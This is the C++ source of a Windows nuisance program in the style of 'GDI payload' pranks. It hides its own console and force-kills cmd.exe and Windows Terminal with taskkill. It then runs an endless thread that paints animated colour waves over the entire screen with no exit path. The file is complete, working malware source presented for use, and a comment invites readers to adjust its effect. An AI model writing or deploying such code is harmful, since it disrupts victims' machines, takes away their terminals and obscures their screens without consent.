#include <windows.h>
#include <cmath>

struct ColorUtils {
	static COLORREF HSL2RGB(float h, float s, float l) {
		float r, g, b;

		auto hue2rgb = [](float p, float q, float t) {
			if (t < 0) t += 1;
			if (t > 1) t -= 1;
			if (t < 1.f / 6) return p + (q - p) * 6 * t;
			if (t < 1.f / 2) return q;
			if (t < 2.f / 3) return p + (q - p) * (2.f / 3 - t) * 6;
			return p;
			};

		if (s == 0) {
			r = g = b = l;
		}
		else {
			float q = l < 0.5f ? l * (1 + s) : l + s - l * s;
			float p = 2 * l - q;
			r = hue2rgb(p, q, h + 1.f / 3);
			g = hue2rgb(p, q, h);
			b = hue2rgb(p, q, h - 1.f / 3);
		}

		return RGB(r * 255, g * 255, b * 255);
	}
};

DWORD WINAPI shader(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdcMem = CreateCompatibleDC(hdc);
	HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcMem, hbm);

	float time = 0;
	while (true) {
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

		// change these free!
		float hueSpeed = 10;
		float waveFreqX = 10;
		float waveFreqY = 10;
		float waveAmp = 100;

		for (int y = 0; y < h; y += 2) { 
			for (int x = 0; x < w; x += 2) {
				float waveH = sin(time + x * waveFreqX + y * waveFreqY) * 0.1f;
				float waveS = 0.7f + sin(time * 0.7f + y * waveFreqY * 0.5f) * 0.2f;
				float waveL = 0.5f + sin(time * 0.5f + x * waveFreqX * 0.3f) * 0.2f;
				float hue = fmod(time * hueSpeed +
					(x + y) / (float)(w + h) +
					sin(time * 0.3f + x * 0.01f) * 0.1f, 1.0f);
				COLORREF color = ColorUtils::HSL2RGB(
					hue + waveH,
					fabs(waveS),
					fabs(waveL)
				);
				SetPixel(hdc, x, y, color);
				SetPixel(hdc, x + 1, y, color);
				SetPixel(hdc, x, y + 1, color);
				SetPixel(hdc, x + 1, y + 1, color);
			}
		}

		time += 0.01f;
	}

	DeleteObject(hbm);
	DeleteDC(hdcMem);
	ReleaseDC(0, hdc);
	return 0;
}
int main(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
	AllocConsole();
	FreeConsole();

	ShellExecuteA(NULL, NULL, "taskkill", "/f /im windowsterminal.exe", NULL, SW_SHOWDEFAULT);
	ShellExecuteA(NULL, NULL, "taskkill", "/f /im cmd.exe", NULL, SW_SHOWDEFAULT);
	HANDLE waeform = CreateThread(0, 0, shader, 0, 0, 0);
	Sleep(-1);
}